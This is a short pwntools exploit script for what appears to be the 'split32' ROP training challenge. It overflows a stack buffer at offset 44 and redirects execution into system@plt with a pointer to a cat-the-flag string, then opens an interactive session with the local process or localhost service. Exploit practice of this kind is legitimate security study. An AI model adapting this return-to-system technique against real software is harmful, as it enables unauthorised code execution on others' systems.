from pwn import *

exe = ELF('./split32')
context.binary = exe
context.log_level = 'info'

libc = ELF('./split32')

if args.REMOTE:
    io = remote('localhost', 4000)
else:
    io = process(exe.path)

offset = 44 #pattern search $eip
usefulFunctiondirectsursys = 0x80483e0 #0x0804861a <+14>:	call   0x80483e0 <system@plt>
ret = 0x0804837e
bincat = 0x804a030
padding = b'BBBB'


log.info(hex(usefulFunctiondirectsursys))

payload = flat({offset:[usefulFunctiondirectsursys,padding,bincat]})

io.sendline(payload)

io.interactive()

